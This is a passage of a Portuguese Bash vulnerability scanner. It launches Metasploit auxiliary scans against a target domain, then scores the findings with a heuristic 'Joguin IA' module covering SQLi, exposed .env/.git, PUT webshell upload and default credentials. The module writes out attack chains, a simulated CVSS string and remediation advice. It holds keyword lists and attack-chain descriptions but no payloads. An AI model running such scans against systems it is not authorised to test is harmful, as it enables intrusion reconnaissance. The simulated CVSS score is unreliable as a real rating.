set RHOSTS $DOMINIO
set RPORT $PORTA
set THREADS 20
run

use auxiliary/scanner/http/webdav_scanner
set RHOSTS $DOMINIO
set RPORT $PORTA
set THREADS 20
run

exit
EOM
  MSF_OUT=$(timeout 90 msfconsole -q -r "$MSF_RC" 2>/dev/null) || aviso "msfconsole timeout ou falhou"
  rm -f "$MSF_RC"
  echo "$MSF_OUT" | grep -E '\[+\]|\[!\]|\[-\]' | grep -vi 'No response' | while IFS= read -r line; do
    clean=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g' | xargs)
    echo "$clean" | grep -qiE 'vulnerable|found|exposed|disclosure|enabled|accessible|interesting|upload|exec|shell|injection|bypass' && critico "METASPLOIT: $clean"
    echo "$clean" | grep -qiE '\[+\]|detected|allowed|missing|directory|backup|info' && aviso "METASPLOIT: $clean"
  done
fi
else
  aviso "Pulando testes HTTP e exploracao (sem porta web)"
fi

# ===== PASSO 24: JOGUIN IA - ANALISE HEURISTICA AVANCADA =====
progresso "Joguin IA - Analisando dados..." 2
REPORT_TEXT=$(cat "$REPORT" 2>/dev/null)
TOTAL_CRIT=$(echo "$REPORT_TEXT" | grep -c "\[CRITICO\]")
TOTAL_ALERT=$(echo "$REPORT_TEXT" | grep -c "\[ALERTA\]")
TOTAL_ACHADOS=$((TOTAL_CRIT + TOTAL_ALERT))

# --- DETECCOES ---
sql_detect=$(echo "$REPORT_TEXT" | grep -c "SQL INJECTION")
git_detect=$(echo "$REPORT_TEXT" | grep -c "REPOSITORIO GIT")
env_detect=$(echo "$REPORT_TEXT" | grep -c "ARQUIVO .ENV")
put_detect=$(echo "$REPORT_TEXT" | grep -c "Metodo PUT\|WEBSHELL")
config_detect=$(echo "$REPORT_TEXT" | grep -c "CONFIG EXPOSTO\|wp-config\|BACKUP BD")
creds_detect=$(echo "$REPORT_TEXT" | grep -c "DEFAULT CREDENTIALS")
xframe_detect=$(echo "$REPORT_TEXT" | grep -c "Falta X-Frame-Options")
cors_detect=$(echo "$REPORT_TEXT" | grep -c "CORS MISCONFIG")
traversal_detect=$(echo "$REPORT_TEXT" | grep -c "PATH TRAVERSAL")
phpinfo_detect=$(echo "$REPORT_TEXT" | grep -c "PHPINFO EXPOSTO")
redirect_detect=$(echo "$REPORT_TEXT" | grep -c "OPEN REDIRECT")
backup_detect=$(echo "$REPORT_TEXT" | grep -c "BACKUP EXPOSTO\|BACKUP WP-CONFIG\|BACKUP BD")
xss_detect=$(echo "$REPORT_TEXT" | grep -c "Possivel XSS")
ssti_detect=$(echo "$REPORT_TEXT" | grep -c "Possivel SSTI")
crossdomain_detect=$(echo "$REPORT_TEXT" | grep -c "CROSSDOMAIN.XML")
services_detect=$(echo "$REPORT_TEXT" | grep -c "SERVICO ENCONTRADO")
auth_detect=$(echo "$REPORT_TEXT" | grep -c "AUTENTICACAO REQUERIDA")
waf_detect=$(echo "$REPORT_TEXT" | grep -c "WAF detectado")
ssl_weak_detect=$(echo "$REPORT_TEXT" | grep -c "SSL ciphers fracos\|HEARTBLEED\|TLSv1\.0\|TLSv1\.1")
accesso_livre=$(echo "$REPORT_TEXT" | grep -c "ACESSO LIVRE")
metasploit_detect=$(echo "$REPORT_TEXT" | grep -c "METASPLOIT:")

# --- PERFIL DO SITE COM TECNOLOGIAS ---
SITE_PERFIL=""
[ "$TEC_WP" = "1" ] && SITE_PERFIL="${SITE_PERFIL}WordPress detectado. "
[ "$TEC_NGINX" = "1" ] && SITE_PERFIL="${SITE_PERFIL}Servidor Nginx. "
[ "$TEC_APACHE" = "1" ] && SITE_PERFIL="${SITE_PERFIL}Servidor Apache. "
[ "$TEC_IIS" = "1" ] && SITE_PERFIL="${SITE_PERFIL}Servidor IIS. "
[ "$TEC_PHP" = "1" ] && SITE_PERFIL="${SITE_PERFIL}PHP detectado. "
[ "$TEC_NODE" = "1" ] && SITE_PERFIL="${SITE_PERFIL}Node.js detectado. "
[ "$TEC_SPA" = "1" ] && SITE_PERFIL="${SITE_PERFIL}SPA (${TEC_REACT:+React }${TEC_ANGULAR:+Angular }${TEC_VUE:+Vue}). "
[ "$TEC_API" = "1" ] && SITE_PERFIL="${SITE_PERFIL}API REST/GraphQL detectada. "
[ "$TEC_LOGIN" = "1" ] && SITE_PERFIL="${SITE_PERFIL}Pagina de login encontrada. "
[ "$TEC_UPLOAD" = "1" ] && SITE_PERFIL="${SITE_PERFIL}Upload de arquivos. "
[ -z "$SITE_PERFIL" ] && SITE_PERFIL="Site estatico ou infraestrutura padrao. "

# --- PESOS E SCORES (por categoria de risco) ---
declare -A SCORES
SCORES["SQL INJECTION"]=95; SCORES["PATH TRAVERSAL"]=90; SCORES["WEBSHELL UPLOAD"]=100
SCORES["REPOSITORIO GIT"]=80; SCORES["ARQUIVO .ENV"]=85; SCORES["DEFAULT CREDENTIALS"]=90
SCORES["OPEN REDIRECT"]=40; SCORES["Metodo PUT"]=70; SCORES["PHPINFO EXPOSTO"]=50
SCORES["CONFIG EXPOSTO"]=80; SCORES["BACKUP"]=70; SCORES["SERVICO ENCONTRADO"]=40
SCORES["CROSSDOMAIN.XML"]=35; SCORES["Falta X-Frame-Options"]=45; SCORES["Falta HSTS"]=25
SCORES["Falta CSP"]=30; SCORES["Falta X-Content-Type-Options"]=20; SCORES["Falta X-XSS-Protection"]=20
SCORES["Cookie sem flag Secure"]=35; SCORES["WAF detectado"]=10; SCORES["Possivel XSS"]=60
SCORES["Possivel SSTI"]=70; SCORES["CORS MISCONFIG"]=55; SCORES["AUTENTICACAO REQUERIDA"]=15
SCORES["SSL ciphers fracos"]=50; SCORES["METASPLOIT:"]=75
SCORES["ACESSO LIVRE"]=60; SCORES["HEARTBLEED"]=100

# --- CORRELACAO AVANCADA ---
CORRELATION_WEIGHT=0
ATTACK_CHAINS=()
if [ "$put_detect" -gt 0 ] && [ "$git_detect" -gt 0 ]; then
  ATTACK_CHAINS+=("PUT + .git: Upload webshell -> roubo de credenciais do repositorio"); CORRELATION_WEIGHT=$((CORRELATION_WEIGHT + 20))
fi
if [ "$put_detect" -gt 0 ] && [ "$creds_detect" -gt 0 ]; then
  ATTACK_CHAINS+=("PUT + Admin: Upload webshell -> execucao de comandos como admin"); CORRELATION_WEIGHT=$((CORRELATION_WEIGHT + 25))
fi
if [ "$sql_detect" -gt 0 ] && [ "$config_detect" -gt 0 ]; then
  ATTACK_CHAINS+=("SQLi + Config: Extracao de dados -> acesso a credenciais do sistema"); CORRELATION_WEIGHT=$((CORRELATION_WEIGHT + 30))
fi
if [ "$sql_detect" -gt 0 ] && [ "$env_detect" -gt 0 ]; then
  ATTACK_CHAINS+=("SQLi + .env: Extracao de dados -> chaves de API e tokens"); CORRELATION_WEIGHT=$((CORRELATION_WEIGHT + 25))
fi
if [ "$creds_detect" -gt 0 ] && [ "$put_detect" -gt 0 ]; then
  ATTACK_CHAINS+=("Creds + PUT: Admin autenticado faz upload de webshell -> TOMADA TOTAL DO SERVIDOR"); CORRELATION_WEIGHT=$((CORRELATION_WEIGHT + 40))
fi
if [ "$git_detect" -gt 0 ] && [ "$env_detect" -gt 0 ]; then
  ATTACK_CHAINS+=("Git + .env: Codigo fonte + credenciais de producao vazadas"); CORRELATION_WEIGHT=$((CORRELATION_WEIGHT + 20))
fi
if [ "$xframe_detect" -gt 0 ] && [ "$cors_detect" -gt 0 ]; then
  ATTACK_CHAINS+=("Clickjacking + CORS: Site iframado + API acessivel -> ataque cross-origin"); CORRELATION_WEIGHT=$((CORRELATION_WEIGHT + 15))
fi
if [ "$sql_detect" -gt 0 ] && [ "$xss_detect" -gt 0 ]; then
  ATTACK_CHAINS+=("SQLi + XSS: Injecao em banco + execucao de script -> ataque persistente"); CORRELATION_WEIGHT=$((CORRELATION_WEIGHT + 20))
fi
if [ "$traversal_detect" -gt 0 ] && [ "$config_detect" -gt 0 ]; then
  ATTACK_CHAINS+=("Path traversal + Config: Leitura de arquivos do sistema + credenciais"); CORRELATION_WEIGHT=$((CORRELATION_WEIGHT + 25))
fi
if [ "$sql_detect" -gt 0 ] && [ "$traversal_detect" -gt 0 ]; then
  ATTACK_CHAINS+=("SQLi + Path Traversal: Acesso irrestrito ao banco + sistema de arquivos"); CORRELATION_WEIGHT=$((CORRELATION_WEIGHT + 35))
fi
if [ "$put_detect" -gt 0 ] && [ "$phpinfo_detect" -gt 0 ]; then
  ATTACK_CHAINS+=("PUT + phpinfo: Mapeamento de caminhos + upload de webshell -> RCE"); CORRELATION_WEIGHT=$((CORRELATION_WEIGHT + 20))
fi
if [ "$creds_detect" -gt 0 ] && [ "$xss_detect" -gt 0 ]; then
  ATTACK_CHAINS+=("Admin + XSS: Roubo de sessao do administrador -> acesso total"); CORRELATION_WEIGHT=$((CORRELATION_WEIGHT + 25))
fi

# --- SCORE FINAL ---
TOTAL_PONTOS=0
[ "$TOTAL_ACHADOS" -eq 0 ] && TOTAL_ACHADOS=1
for key in "${!SCORES[@]}"; do
  count=$(echo "$REPORT_TEXT" | grep -c "$key")
  [ "$count" -gt 0 ] && TOTAL_PONTOS=$((TOTAL_PONTOS + (SCORES[$key] * count)))
done
TOTAL_PONTOS=$((TOTAL_PONTOS + CORRELATION_WEIGHT))
RAW_SCORE=$((TOTAL_PONTOS * 100 / (TOTAL_ACHADOS * 100 + CORRELATION_WEIGHT)))
[ "$RAW_SCORE" -gt 100 ] && RAW_SCORE=100; [ "$RAW_SCORE" -lt 0 ] && RAW_SCORE=0

if [ "$RAW_SCORE" -ge 75 ]; then IA_NIVEL="CRITICO"; IA_COR=$RED
elif [ "$RAW_SCORE" -ge 50 ]; then IA_NIVEL="ALTO"; IA_COR=$YELLOW
elif [ "$RAW_SCORE" -ge 25 ]; then IA_NIVEL="MEDIO"; IA_COR=$YELLOW
else IA_NIVEL="BAIXO"; IA_COR=$GREEN; fi

MAIN_VECTOR=""
if [ "$put_detect" -gt 0 ] && [ "$creds_detect" -gt 0 ]; then MAIN_VECTOR="Upload + Admin -> RCE (tomada total)"
elif [ "$sql_detect" -gt 0 ] && [ "$traversal_detect" -gt 0 ]; then MAIN_VECTOR="SQLi + Path Traversal -> Data Breach + RCE"
elif [ "$sql_detect" -gt 0 ] && [ "$config_detect" -gt 0 ]; then MAIN_VECTOR="SQLi + Config -> Data Breach + Escalacao"
elif [ "$put_detect" -gt 0 ]; then MAIN_VECTOR="PUT -> Upload de webshell -> RCE"
elif [ "$creds_detect" -gt 0 ]; then MAIN_VECTOR="Default Creds -> Acesso Admin -> Controle total"
elif [ "$sql_detect" -gt 0 ]; then MAIN_VECTOR="SQLi -> Extracao de dados do banco"
elif [ "$git_detect" -gt 0 ] || [ "$env_detect" -gt 0 ]; then MAIN_VECTOR="Vazamento de dados sensiveis"
elif [ "$xss_detect" -gt 0 ]; then MAIN_VECTOR="XSS -> Roubo de sessao de usuarios"
elif [ "$accesso_livre" -gt 0 ]; then MAIN_VECTOR="Diretorios expostos -> informacoes sensiveis"
else MAIN_VECTOR="Multiplos fatores de risco baixo/médio"; fi

# --- SCORE POR CATEGORIA ---
CAT_EXEC_CODE=0; CAT_DATA_LEAK=0; CAT_ACCESS=0; CAT_CONFIG=0; CAT_CRYPTO=0
[ "$sql_detect" -gt 0 ] && CAT_EXEC_CODE=$((CAT_EXEC_CODE + 35))
[ "$traversal_detect" -gt 0 ] && CAT_EXEC_CODE=$((CAT_EXEC_CODE + 30))
[ "$put_detect" -gt 0 ] && CAT_EXEC_CODE=$((CAT_EXEC_CODE + 25))
[ "$ssti_detect" -gt 0 ] && CAT_EXEC_CODE=$((CAT_EXEC_CODE + 20))
[ "$metasploit_detect" -gt 0 ] && CAT_EXEC_CODE=$((CAT_EXEC_CODE + 15))
[ "$git_detect" -gt 0 ] && CAT_DATA_LEAK=$((CAT_DATA_LEAK + 25))
[ "$env_detect" -gt 0 ] && CAT_DATA_LEAK=$((CAT_DATA_LEAK + 30))
[ "$config_detect" -gt 0 ] && CAT_DATA_LEAK=$((CAT_DATA_LEAK + 20))
[ "$backup_detect" -gt 0 ] && CAT_DATA_LEAK=$((CAT_DATA_LEAK + 15))
[ "$phpinfo_detect" -gt 0 ] && CAT_DATA_LEAK=$((CAT_DATA_LEAK + 10))
[ "$creds_detect" -gt 0 ] && CAT_ACCESS=$((CAT_ACCESS + 35))
[ "$auth_detect" -gt 0 ] && CAT_ACCESS=$((CAT_ACCESS + 5))
[ "$accesso_livre" -gt 0 ] && CAT_ACCESS=$((CAT_ACCESS + 25))
[ "$xss_detect" -gt 0 ] && CAT_ACCESS=$((CAT_ACCESS + 15))
[ "$cors_detect" -gt 0 ] && CAT_ACCESS=$((CAT_ACCESS + 10))
[ "$xframe_detect" -gt 0 ] && CAT_CONFIG=$((CAT_CONFIG + 15))
[ "$(echo "$REPORT_TEXT" | grep -c "Falta HSTS")" -gt 0 ] && CAT_CONFIG=$((CAT_CONFIG + 10))
[ "$(echo "$REPORT_TEXT" | grep -c "Falta CSP")" -gt 0 ] && CAT_CONFIG=$((CAT_CONFIG + 10))
[ "$(echo "$REPORT_TEXT" | grep -c "Falta X-Content-Type-Options")" -gt 0 ] && CAT_CONFIG=$((CAT_CONFIG + 5))
[ "$(echo "$REPORT_TEXT" | grep -c "Cookie sem flag Secure")" -gt 0 ] && CAT_CONFIG=$((CAT_CONFIG + 10))
[ "$crossdomain_detect" -gt 0 ] && CAT_CONFIG=$((CAT_CONFIG + 5))
[ "$ssl_weak_detect" -gt 0 ] && CAT_CRYPTO=$((CAT_CRYPTO + 30))
[ "$redirect_detect" -gt 0 ] && CAT_CRYPTO=$((CAT_CRYPTO + 10))
[ "$PROTOCOLO" = "http" ] && CAT_CRYPTO=$((CAT_CRYPTO + 20))

# --- NARRATIVA CONTEXTUAL AVANCADA ---
NARRATIVA=""
NARRATIVA="${NARRATIVA}  AVALIACAO: ${IA_NIVEL}. "
if [ "$TOTAL_ACHADOS" -le 2 ] && [ "$RAW_SCORE" -lt 25 ]; then
  NARRATIVA="${NARRATIVA}A superficie de ataque deste alvo e limitada. "
  NARRATIVA="${NARRATIVA}Nao foram encontradas vulnerabilidades criticas, e as configuracoes de seguranca parecem adequadas. "
  NARRATIVA="${NARRATIVA}Recomenda-se manter as atualizacoes em dia e realizar scans periodicos para deteccao precoce. "
elif [ "$TOTAL_ACHADOS" -le 5 ] && [ "$RAW_SCORE" -lt 50 ]; then
  NARRATIVA="${NARRATIVA}O alvo apresenta vulnerabilidades de severidade baixa a moderada. "
  NARRATIVA="${NARRATIVA}Embora nenhuma falha grave isolada tenha sido identificada, a combinacao de multiplos "
  NARRATIVA="${NARRATIVA}problemas de configuracao aumenta a superficie de ataque. "
  [ "$CAT_CONFIG" -gt 15 ] && NARRATIVA="${NARRATIVA}Headers de seguranca ausentes sao o principal fator de risco. "
  [ "$CAT_CRYPTO" -gt 10 ] && NARRATIVA="${NARRATIVA}A camada de criptografia requiere atencao. "
  NARRATIVA="${NARRATIVA}Recomenda-se hardening de headers e revisao de criptografia. "
elif [ "$RAW_SCORE" -ge 50 ] && [ "$RAW_SCORE" -lt 75 ]; then
  NARRATIVA="${NARRATIVA}Risco elevado. O alvo possui vulnerabilidades que, embora nao sejam criticas isoladamente, "
  NARRATIVA="${NARRATIVA}podem ser encadeadas para comprometer o servidor. "
  [ "$CAT_EXEC_CODE" -gt 30 ] && NARRATIVA="${NARRATIVA}Hua possibilidade de execucao remota de codigo atraves de "
  NARRATIVA="${NARRATIVA}$([ "$sql_detect" -gt 0 ] && echo "SQL Injection" )$([ "$sql_detect" -gt 0 ] && [ "$traversal_detect" -gt 0 ] && echo " e " )$([ "$traversal_detect" -gt 0 ] && echo "Path Traversal" ). "
  [ "$CAT_DATA_LEAK" -gt 25 ] && NARRATIVA="${NARRATIVA}Dados sensiveis estao expostos (credenciais, codigo fonte, backups). "
  [ "$CAT_ACCESS" -gt 20 ] && NARRATIVA="${NARRATIVA}O controle de acesso e fragil - "
  NARRATIVA="${NARRATIVA}$([ "$creds_detect" -gt 0 ] && echo "credenciais padrao funcionam" )$([ "$creds_detect" -gt 0 ] && [ "$accesso_livre" -gt 0 ] && echo " e " )$([ "$accesso_livre" -gt 0 ] && echo "diretorios administrativos estao acessiveis" ). "
  NARRATIVA="${NARRATIVA}Priorize a correcao das cadeias de ataque identificadas. "
else
  NARRATIVA="${NARRATIVA}Este alvo apresenta falhas GRAVES de seguranca que permitem acesso remoto "
  NARRATIVA="${NARRATIVA}nao autorizado ao servidor e aos dados. Um atacante pode: "
  first=1
  [ "$put_detect" -gt 0 ] && [ "$creds_detect" -gt 0 ] && {
    NARRATIVA="${NARRATIVA}(1) obter acesso administrativo com credenciais padrao, (2) fazer upload de webshell via PUT, "
    NARRATIVA="${NARRATIVA}(3) executar comandos no servidor como root"
    first=0
  }
  [ "$sql_detect" -gt 0 ] && {
    [ "$first" -eq 0 ] && NARRATIVA="${NARRATIVA}; ou ainda "
    NARRATIVA="${NARRATIVA}(1) extrair todo o banco de dados via SQL Injection, "
    NARRATIVA="${NARRATIVA}(2) obter credenciais de producao em arquivos expostos (.env, config)"
    first=0
  }
  [ "$git_detect" -gt 0 ] && [ "$env_detect" -gt 0 ] && {
    [ "$first" -eq 0 ] && NARRATIVA="${NARRATIVA}; alternativamente "
    NARRATIVA="${NARRATIVA}(1) baixar o repositorio Git completo, (2) extrair chaves de API e tokens do .env"
    first=0
  }
  [ "$first" -eq 1 ] && NARRATIVA="${NARRATIVA}explorar as multiplas vulnerabilidades identificadas para comprometer o sistema. "
  NARRATIVA="${NARRATIVA} Recomendacao: interrompa o acesso externo imediatamente e corrija as falhas criticas. "
fi

# --- CVSS SIMULADO ---
CVSS_STRING="CVSS:3.1/AV:N/AC:L"
if [ "$sql_detect" -gt 0 ] || [ "$traversal_detect" -gt 0 ]; then
  CVSS_STRING="${CVSS_STRING}/PR:N/UI:N"
elif [ "$creds_detect" -gt 0 ] && [ "$xss_detect" -gt 0 ]; then
  CVSS_STRING="${CVSS_STRING}/PR:L/UI:R"
elif [ "$creds_detect" -gt 0 ]; then
  CVSS_STRING="${CVSS_STRING}/PR:L/UI:N"
elif [ "$xss_detect" -gt 0 ]; then
  CVSS_STRING="${CVSS_STRING}/PR:N/UI:R"
else
  CVSS_STRING="${CVSS_STRING}/PR:N/UI:N"
fi
if [ "$RAW_SCORE" -ge 75 ]; then
  CVSS_STRING="${CVSS_STRING}/S:C/C:H/I:H/A:H"
elif [ "$RAW_SCORE" -ge 50 ]; then
  CVSS_STRING="${CVSS_STRING}/S:U/C:H/I:L/A:L"
else
  CVSS_STRING="${CVSS_STRING}/S:U/C:L/I:L/A:N"
fi
CVSS_SCORE=$(echo "scale=1; $RAW_SCORE * 10 / 100" | bc 2>/dev/null)
[ -z "$CVSS_SCORE" ] && CVSS_SCORE="N/A"

# --- QUICK WINS ---
QUICK_WINS=()
echo "$REPORT_TEXT" | grep -qi "Metodo PUT" && [ ${#QUICK_WINS[@]} -lt 3 ] && QUICK_WINS+=("Desabilite o metodo PUT (risco de RCE imediato)")
echo "$REPORT_TEXT" | grep -qi "DEFAULT CREDENTIALS" && [ ${#QUICK_WINS[@]} -lt 3 ] && QUICK_WINS+=("Troque todas as senhas padrao (admin:admin, root:root)")
echo "$REPORT_TEXT" | grep -qi "REPOSITORIO GIT" && [ ${#QUICK_WINS[@]} -lt 3 ] && QUICK_WINS+=("Bloqueie acesso ao .git (vazamento de codigo fonte)")
echo "$REPORT_TEXT" | grep -qi "ARQUIVO .ENV" && [ ${#QUICK_WINS[@]} -lt 3 ] && QUICK_WINS+=("Bloqueie acesso ao .env (credenciais vazando)")
echo "$REPORT_TEXT" | grep -qi "Falta X-Frame-Options" && [ ${#QUICK_WINS[@]} -lt 3 ] && QUICK_WINS+=("Adicione X-Frame-Options (clickjacking)")
echo "$REPORT_TEXT" | grep -qi "PHPINFO EXPOSTO" && [ ${#QUICK_WINS[@]} -lt 3 ] && QUICK_WINS+=("Remova phpinfo.php (configuracoes expostas)")
[ "$PROTOCOLO" = "http" ] && [ ${#QUICK_WINS[@]} -lt 3 ] && QUICK_WINS+=("Migre para HTTPS urgente (dados trafegam em texto claro)")

# --- REMEDIATION ROADMAP ---
FASE1=""; FASE2=""; FASE3=""
echo "$REPORT_TEXT" | grep -qi "Metodo PUT\|WEBSHELL\|DEFAULT CREDENTIALS\|SQL INJECTION\|PATH TRAVERSAL\|HEARTBLEED" && FASE1="Imediata (24h): Bloquear PUT, trocar senhas, corrigir SQLi, path traversal e SSL critico"
echo "$REPORT_TEXT" | grep -qi "REPOSITORIO GIT\|ARQUIVO .ENV\|CONFIG EXPOSTO\|BACKUP\|PHPINFO\|OPEN REDIRECT\|CORS" && FASE2="Curto prazo (1 semana): Bloquear .git/.env, remover backups, corrigir redirect e CORS"
echo "$REPORT_TEXT" | grep -qi "Falta X-Frame-Options\|Falta CSP\|Falta HSTS\|Cookie sem\|CROSSDOMAIN\|X-XSS-Protection\|X-Content-Type-Options\|SERVICO\|ACESSO LIVRE" && FASE3="Medio prazo (1 mes): Adicionar headers de seguranca, restringir diretorios, remover servicos desnecessarios"

# --- SAIDA DA IA MELHORADA ---
echo ""
echo -e "${IA_COR}${BOLD}╔══════════════════════════════════════════════════════════════╗${RESET}"
echo -e "${IA_COR}${BOLD}║        JOGUIN IA - Analise Heuristica de Seguranca          ║${RESET}"
echo -e "${IA_COR}${BOLD}╠══════════════════════════════════════════════════════════════╣${RESET}"
echo -e "${IA_COR}${BOLD}║${RESET}"
echo -e "${IA_COR}${BOLD}║${RESET}  ${BOLD}Resumo Executivo${RESET}"
echo -e "${IA_COR}${BOLD}║${RESET}  ${IA_COR}$(echo "$NARRATIVA" | fold -s -w 75 | head -3)${RESET}"
echo -e "${IA_COR}${BOLD}║${RESET}  ${IA_COR}$(echo "$NARRATIVA" | fold -s -w 75 | tail -n +4)${RESET}"
echo -e "${IA_COR}${BOLD}║${RESET}"
echo -e "${IA_COR}${BOLD}║${RESET}  ${BOLD}Perfil do site:${RESET} ${CYAN}$SITE_PERFIL${RESET}"
echo -e "${IA_COR}${BOLD}║${RESET}"
echo -e "${IA_COR}${BOLD}║${RESET}  ${BOLD}Score de risco:${RESET}  ${IA_COR}${RAW_SCORE}% - ${IA_NIVEL}    ${BOLD}CVSS:${RESET} ${CYAN}${CVSS_STRING}${RESET}"
echo -e "${IA_COR}${BOLD}║${RESET}  ${BOLD}Achados:${RESET}        ${CYAN}${TOTAL_CRIT} criticos, ${TOTAL_ALERT} alertas    ${BOLD}Peso correl.:${RESET} ${CYAN}+${CORRELATION_WEIGHT}${RESET}"
echo -e "${IA_COR}${BOLD}║${RESET}  ${BOLD}Vetor principal:${RESET} ${IA_COR}$MAIN_VECTOR${RESET}"
echo -e "${IA_COR}${BOLD}║${RESET}"
# --- RISK BREAKDOWN ---
CAT_TOTAL=$((CAT_EXEC_CODE + CAT_DATA_LEAK + CAT_ACCESS + CAT_CONFIG + CAT_CRYPTO))
[ "$CAT_TOTAL" -eq 0 ] && CAT_TOTAL=1
echo -e "${IA_COR}${BOLD}║${RESET}  ${BOLD}Decomposicao de Risco por Categoria:${RESET}"
CAT_BARS=("Execucao de Codigo" "$CAT_EXEC_CODE" "$RED" "Vazamento de Dados" "$CAT_DATA_LEAK" "$RED" "Controle de Acesso" "$CAT_ACCESS" "$YELLOW" "Configuracao" "$CAT_CONFIG" "$YELLOW" "Criptografia" "$CAT_CRYPTO" "$CYAN")
for ((i=0;i<${#CAT_BARS[@]};i+=3)); do
  nome="${CAT_BARS[$i]}"; val="${CAT_BARS[$((i+1))]}"; cor="${CAT_BARS[$((i+2))]}"
  pct=$((val * 100 / CAT_TOTAL))
  [ "$pct" -gt 100 ] && pct=100
  nfill=$((pct / 4)); nempty=$((25 - nfill))
  [ "$nfill" -gt 25 ] && nfill=25; [ "$nempty" -lt 0 ] && nempty=0
  bf=$(printf "%${nfill}s" 2>/dev/null | tr ' ' '#'); be=$(printf "%${nempty}s" 2>/dev/null)
  echo -e "${IA_COR}${BOLD}║${RESET}    ${cor}[${bf}${be}]${RESET}  ${pct}% - ${nome}"
done
echo -e "${IA_COR}${BOLD}║${RESET}"
# --- QUICK WINS ---
[ ${#QUICK_WINS[@]} -gt 0 ] && {
  echo -e "${IA_COR}${BOLD}║${RESET}  ${BOLD}Quick Wins - Correcoes Urgentes:${RESET}"
  for qw in "${QUICK_WINS[@]}"; do echo -e "${IA_COR}${BOLD}║${RESET}    ${GREEN}$qw${RESET}"; done
  echo -e "${IA_COR}${BOLD}║${RESET}"
}
# --- CHAINS ---
echo -e "${IA_COR}${BOLD}║${RESET}  ${BOLD}Cadeias de ataque identificadas:${RESET}"
if [ ${#ATTACK_CHAINS[@]} -eq 0 ]; then
  echo -e "${IA_COR}${BOLD}║${RESET}    ${GREEN}Nenhuma cadeia de ataque critica${RESET}"
else
  for chain in "${ATTACK_CHAINS[@]}"; do echo -e "${IA_COR}${BOLD}║${RESET}    ${RED}$chain${RESET}"; done
fi
echo -e "${IA_COR}${BOLD}║${RESET}"
# --- IMPACT BY CATEGORY ---
echo -e "${IA_COR}${BOLD}║${RESET}  ${BOLD}Analise de impacto por categoria:${RESET}"
cat_impact() {
  local name="$1" detect="$2" impact="$3" color="$4"
  [ "$detect" -gt 0 ] && echo -e "${IA_COR}${BOLD}║${RESET}    ${color}$name: $impact${RESET}" || echo -e "${IA_COR}${BOLD}║${RESET}    ${GREEN}$name: Nao detectado${RESET}"
}
cat_impact "SQL Injection" "$sql_detect" "Perda total de dados do banco" "$RED"
cat_impact "Upload / Webshell" "$put_detect" "Execucao remota de codigo (RCE)" "$RED"
cat_impact "Credenciais Padrao" "$creds_detect" "Acesso administrativo total" "$RED"
cat_impact "Vazamento de Dados" "$((git_detect + env_detect + config_detect + backup_detect + phpinfo_detect))" "Exposicao de dados sensiveis" "$RED"
cat_impact "Cross-Site Scripting" "$xss_detect" "Roubo de sessao de usuarios" "$YELLOW"
cat_impact "Path Traversal" "$traversal_detect" "Leitura de arquivos do sistema" "$RED"
cat_impact "Criptografia Fraca" "$ssl_weak_detect" "Interceptacao de trafego (MitM)" "$YELLOW"
cat_impact "Headers de Seguranca" "$((xframe_detect + cors_detect))" "Clickjacking, XSS, ataques cross-origin" "$YELLOW"
echo -e "${IA_COR}${BOLD}║${RESET}"
# --- TECH INSIGHTS ---
if [ -n "$TEC_NOME" ]; then
  echo -e "${IA_COR}${BOLD}║${RESET}  ${BOLD}Recomendacoes por Tecnologia Detectada:${RESET}"
  [ "$TEC_WP" = "1" ] && echo -e "${IA_COR}${BOLD}║${RESET}    ${CYAN}WordPress:${RESET} Mantenha core, temas e plugins atualizados. Remova usuarios e arquivos padrao."
  [ "$TEC_PHP" = "1" ] && echo -e "${IA_COR}${BOLD}║${RESET}    ${CYAN}PHP:${RESET} Desabilite expose_php e display_errors. Use opcache e disable_functions."
  [ "$TEC_NGINX" = "1" ] && echo -e "${IA_COR}${BOLD}║${RESET}    ${CYAN}Nginx:${RESET} Remova server_tokens. Configure rate limiting e WAF (ModSecurity)."
  [ "$TEC_APACHE" = "1" ] && echo -e "${IA_COR}${BOLD}║${RESET}    ${CYAN}Apache:${RESET} Desabilite mod_info, mod_status, ServerTokens. Use ModSecurity."
  [ "$TEC_NODE" = "1" ] && echo -e "${IA_COR}${BOLD}║${RESET}    ${CYAN}Node.js:${RESET} Nao rode como root. Use helmet para headers de seguranca. Limite corpo de requisicoes."
  [ "$TEC_JAVA" = "1" ] && echo -e "${IA_COR}${BOLD}║${RESET}    ${CYAN}Java:${RESET} Desabilite JMX remoto. Use SecurityManager. Atualize o JDK."
  [ "$TEC_API" = "1" ] && echo -e "${IA_COR}${BOLD}║${RESET}    ${CYAN}API:${RESET} Implemente rate limiting, autenticacao por token, validacao de input e CORS restritivo."
  echo -e "${IA_COR}${BOLD}║${RESET}"
fi
# --- REMEDIATION ROADMAP ---
[ -n "$FASE1" ] && { echo -e "${IA_COR}${BOLD}║${RESET}  ${RED}Fase 1 - $FASE1${RESET}"; }
[ -n "$FASE2" ] && { echo -e "${IA_COR}${BOLD}║${RESET}  ${YELLOW}Fase 2 - $FASE2${RESET}"; }
[ -n "$FASE3" ] && { echo -e "${IA_COR}${BOLD}║${RESET}  ${CYAN}Fase 3 - $FASE3${RESET}"; }
echo -e "${IA_COR}${BOLD}║${RESET}"
# --- ATTACK SURFACE ---
SURFACE_PORTS=$(echo "$REPORT_TEXT" | grep -cE "PORTA ABERTA|SERVICO ENCONTRADO")
SURFACE_PATH=$(echo "$REPORT_TEXT" | grep -cE "ACESSO LIVRE|DIRETORIO|BACKUP|CONFIG EXPOSTO|INFO PHP|BACKUP WP-CONFIG|BACKUP BD|SERVICO ENCONTRADO")
SURFACE_EXPLOIT=$(echo "$REPORT_TEXT" | grep -cE "SQL INJECTION|WEBSHELL|PUT|DEFAULT CREDENTIALS|REPOSITORIO GIT|ARQUIVO .ENV|PATH TRAVERSAL|METASPLOIT:")
SURFACE_TOTAL=$((SURFACE_PORTS * 2 + SURFACE_PATH * 3 + SURFACE_EXPLOIT * 5))
[ "$SURFACE_TOTAL" -gt 100 ] && SURFACE_TOTAL=100
SURFACE_BAR=$(printf "%$((SURFACE_TOTAL / 2))s" 2>/dev/null | tr ' ' '#')
SURFACE_EMPTY=$(printf "%$((50 - SURFACE_TOTAL / 2))s" 2>/dev/null)
echo -e "${IA_COR}${BOLD}║${RESET}  ${BOLD}Superficie de ataque:${RESET}"
echo -e "${IA_COR}${BOLD}║${RESET}    ${IA_COR}[${SURFACE_BAR}${SURFACE_EMPTY}]${RESET}  ${SURFACE_TOTAL}%"
